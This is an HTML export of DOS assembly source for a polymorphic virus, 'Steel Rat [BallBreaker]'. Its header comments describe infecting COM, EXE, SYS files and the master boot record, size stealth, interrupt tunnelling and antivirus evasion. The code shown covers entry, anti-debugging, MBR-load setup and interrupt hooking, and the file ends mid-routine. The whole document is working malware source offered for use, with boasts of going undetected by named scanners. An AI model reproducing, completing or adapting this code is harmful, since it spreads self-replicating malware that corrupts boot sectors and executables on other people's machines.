<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; [Steel Rat] is my old virus. And this is remake of it...</span><span class="sc0">

</span><span class="sc1">; [BallBreaker] ;)</span><span class="sc0">
</span><span class="sc1">; Polymorphic TSR Com/Exe/Sys/Mbr Infector with semi-stealth abilities.</span><span class="sc0">

</span><span class="sc1">; In NeXT GENERATiON added</span><span class="sc0">
</span><span class="sc1">;   - MBR Infecting</span><span class="sc0">
</span><span class="sc1">;   - When running under Windows,MBR infection turned off</span><span class="sc0">
</span><span class="sc1">;   - Filesize stealth (Findfirst/Findnext)</span><span class="sc0">
</span><span class="sc1">;   - Polymorphic decryptor generator (SMM)</span><span class="sc0">
</span><span class="sc1">;   - Slow polymorphic</span><span class="sc0">
</span><span class="sc1">;   - Part of host crypting (in Exe'n'Com files)</span><span class="sc0">
</span><span class="sc1">;   - Full MBR stealth (i13)</span><span class="sc0">
</span><span class="sc1">;   - When loaded from MBR patches MCB chain to create own MCB.</span><span class="sc0">
</span><span class="sc1">;   - Dos Idle</span><span class="sc0">
</span><span class="sc1">;   - Simple feature (joke)</span><span class="sc0">
</span><span class="sc1">;   - Simple anti-bait feature</span><span class="sc0">
</span><span class="sc1">;   - Has simple AV protection...</span><span class="sc0">
</span><span class="sc1">;   - Gets 21 int in non-standart way or just tunnels it.</span><span class="sc0">
</span><span class="sc1">;   - Optimized alot</span><span class="sc0">
</span><span class="sc1">;   - Huge , blah...</span><span class="sc0">

</span><span class="sc1">; Needs Smm.Asm in same directory. You can find it in ..\Smm</span><span class="sc0">

</span><span class="sc1">; This is Polymorphic Com/Exe/Sys/Mbr infector. MBR loader is also polymorphic.</span><span class="sc0">

</span><span class="sc1">; I'we added infection using i28 (Dos Idle)- virus intercepts timer vector</span><span class="sc0">
</span><span class="sc1">; and at every tick increasing one variable. When i28 called, virus </span><span class="sc0">
</span><span class="sc1">; checks content of that variable, and if it larger then needed (or equal)</span><span class="sc0">
</span><span class="sc1">; setups DTA, find file and infects it...</span><span class="sc0">

</span><span class="sc1">; Yeap, there is Sys file infection. I dont know why, when Command.Com </span><span class="sc0">
</span><span class="sc1">; isn't loaded, system hangups when i try to infect something... Shit...</span><span class="sc0">
</span><span class="sc1">; So there is check when loaded from MBR/Sys for command.com execution.</span><span class="sc0">
</span><span class="sc1">; When it executed we can start our productive job...</span><span class="sc0">
</span><span class="sc1">; Infection of sys files is VERY simple, very similar to infecting of</span><span class="sc0">
</span><span class="sc1">; Com files.</span><span class="sc0">

</span><span class="sc1">; All infection methods i invented alone (without reading any zines and </span><span class="sc0">
</span><span class="sc1">; looking in another viruses). So Exe infection is quite different from</span><span class="sc0">
</span><span class="sc1">; standard type (think so)...</span><span class="sc0">
</span><span class="sc1">; Polymorphic generator was made, without looking in source of another</span><span class="sc0">
</span><span class="sc1">; generators. I coded crypted com virus, and understand that what does it</span><span class="sc0">
</span><span class="sc1">; means to be polymorphic. So i wrote some simple oligomorphic generators, </span><span class="sc0">
</span><span class="sc1">; then wrote SMM v.1.0 (was polymorphic, but to easy detectable). </span><span class="sc0">
</span><span class="sc1">; Next was SMM 2.xx...It was really polymorphic, but pointer </span><span class="sc0">
</span><span class="sc1">; register was allways same,etc... </span><span class="sc0">
</span><span class="sc1">; In this virus i used SMM v.3.09A. Read it discription in Smm.asm.</span><span class="sc0">

</span><span class="sc1">; Tunnel routine is small and hard detectable (there is only one method,</span><span class="sc0">
</span><span class="sc1">; how to catch it...its ...;). But trace is easy to remove (very</span><span class="sc0">
</span><span class="sc1">; easy). I made something, but that's doesn't enough..</span><span class="sc0">

</span><span class="sc1">; Bugz : With infection marker - i used time to store infection mark </span><span class="sc0">
</span><span class="sc1">; and virus size in current file (was lasy to make something else)...</span><span class="sc0">

</span><span class="sc1">; If you founded some bugs, or have interesting ideas - email me.</span><span class="sc0">
</span><span class="sc1">; E-Mail: Biodrone2@Hotmail.com</span><span class="sc0">

</span><span class="sc1">; To test this virus on your system - just mark TestVir = 1, and put</span><span class="sc0">
</span><span class="sc1">; read-only attribs to all your executables.... ;).</span><span class="sc0">

</span><span class="sc1">; P.S. All viruses i wrote was harmless - so that virus is harmless to..</span><span class="sc0">

</span><span class="sc1">; P.S.S I tested this virus with some AV'rs (when virus is inactive), and</span><span class="sc0">
</span><span class="sc1">;       it was undetectable (Dr.Web,F-Prot)... I have no any other AVr's</span><span class="sc0">
</span><span class="sc1">;   so have no aviability to test SMM decryptor in TBAV or AVP...</span><span class="sc0">

</span><span class="sc1">; P.S.S.S Decryptors couldn't (sometimes) work under Protected Mode inviroment </span><span class="sc0">
</span><span class="sc1">; (Windows,etc)</span><span class="sc0">

</span><span class="sc1">; Personal greetz:  Duke,Sepultura and all people on #SMF.</span><span class="sc0">
</span><span class="sc1">; Group greetz:     SMF,IR</span><span class="sc0">

</span><span class="sc1">; P.S.S.S.S Hey Dukie - your team member SMT is rather cool :P</span><span class="sc0">

</span><span class="sc1">; Deviator [HAZARD].</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc5">TNUM</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">50</span><span class="sc0">  </span><span class="sc1">; Number of residency test to start joke</span><span class="sc0">

</span><span class="sc5">ICheck</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2345h</span><span class="sc0">   </span><span class="sc1">; Infection mark</span><span class="sc0">

</span><span class="sc5">IntChange</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; Number of int 21h changes to hook it</span><span class="sc0">
</span><span class="sc5">MaxG</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; Change this for bigger decryptor</span><span class="sc0">
</span><span class="sc5">MinG</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; sizes. Better dont touch MinG</span><span class="sc0">
    </span><span class="sc1">; Bigger decrypter - it would take some time to decrypt</span><span class="sc0">
    </span><span class="sc1">; That time really feeling on my i386 SX 33 ;)</span><span class="sc0">
</span><span class="sc5">MinCom</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5000</span><span class="sc0">    </span><span class="sc1">; Minimum size of com file</span><span class="sc0">

</span><span class="sc5">TTry</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5</span><span class="sc0">   </span><span class="sc1">; Number of tunnel fails, until stop tunneling.</span><span class="sc0">

</span><span class="sc5">TestVir</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Virus for testing (Doesn't drop file attribs)?</span><span class="sc0">
</span><span class="sc5">CHost</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Crypt host (first 1024 bytes) ?</span><span class="sc0">

</span><span class="sc5">MbrInfect</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Enable MBR infection ?</span><span class="sc0">
</span><span class="sc5">BootDos</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Create own MCB when loading from MBR ?</span><span class="sc0">

</span><span class="sc5">SlowPoly</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Slow polymorphic or not ?</span><span class="sc0">

</span><span class="sc5">i28C</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1000</span><span class="sc0">    </span><span class="sc1">; Timer ticks to start infection using int 28</span><span class="sc0">
</span><span class="sc5">i28U</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Use int 28 infection ?</span><span class="sc0">

</span><span class="sc5">AAV</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Include some Anti-AV procs ?</span><span class="sc0">

</span><span class="sc5">NoStInt21</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Include non-standard raw int 21h detection</span><span class="sc0">
</span><span class="sc5">NoCBait</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Check bait (0 = No check,1 = Check it)</span><span class="sc0">
</span><span class="sc5">i2Au</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; Int 2Ah support (bail out AVPTSR)</span><span class="sc0">
</span><span class="sc5">iCheck2</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">27</span><span class="sc0">  </span><span class="sc1">; Size patch</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">            </span><span class="sc1">; For 286 or higher</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">steel_rat</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3300h</span><span class="sc0">            </span><span class="sc1">; Lets do antiheuristics once-more</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; if somebody decrypted us...</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3301h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3300h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">RIt</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Vlen</span><span class="sc4">/</span><span class="sc2">10</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getsi</span><span class="sc0">
</span><span class="sc5">getsi</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Rit</span><span class="sc4">-</span><span class="sc5">GetSi</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">
    
</span><span class="sc5">RIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3301h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">AntiHE</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">nuke</span><span class="sc0">           </span><span class="sc1">; Bump disasm and try to bump trace</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FFh</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_bp</span><span class="sc0">         </span><span class="sc1">; Get our offset</span><span class="sc0">

</span><span class="sc5">host</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Our Host ( 0 - Com , 1 - Exe , 2 - Sys )</span><span class="sc0">

</span><span class="sc5">get_bp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Host</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">WQuit</span><span class="sc0">

    </span><span class="sc6">cld</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Windoze</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckWin</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">MBRInfect</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_Mbr</span><span class="sc0">     </span><span class="sc1">; Infect Mbr</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">randomize</span><span class="sc0">      </span><span class="sc1">; Setup random number generator</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">SlowPoly</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">RandSeed</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">RSeed</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">install</span><span class="sc0">        </span><span class="sc1">; Install us in memory</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">WQuit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">host</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Return work to our host</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exe_quit</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sys_quit</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">CHost</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">DecryptHost</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">old</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get offset to old com data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Dest - 100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

    </span><span class="sc6">movsw</span><span class="sc0">               </span><span class="sc1">; Copy it...</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">PatchPSp</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">FreeReg</span><span class="sc0">            </span><span class="sc1">; Free regs</span><span class="sc0">

    </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">exe_quit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Patch segment</span><span class="sc0">

    </span><span class="sc6">cli</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">host_ss</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Setup SS:SP</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">host_sp</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">CHost</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">DecryptHost</span><span class="sc0">        </span><span class="sc1">; Decrypt host</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; Store segment to finish</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">             </span><span class="sc1">; Store Ip</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">PatchPSP</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">FreeReg</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">sys_quit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">old</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Restore Sys beginning</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">FreeReg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Jump to host</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">PatchPSP</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Inst</span><span class="sc4">][</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoPatch</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">NeededVlen</span><span class="sc0">
</span><span class="sc5">NoPatch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PatchPSP</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FreeReg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,-</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FreeReg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">MbrInfect</span><span class="sc0">
</span><span class="sc5">MBRInst</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; This would execute when loaded</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; from MBR</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Ds = 0</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Nuke</span><span class="sc0">           </span><span class="sc1">; Bump it !</span><span class="sc0">
    
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">

    </span><span class="sc6">cli</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Point 1Ch to our 1Ch procedure</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Our1C</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i21</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; Store old int 21</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i21</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i13</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; 13h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i13</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">08h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
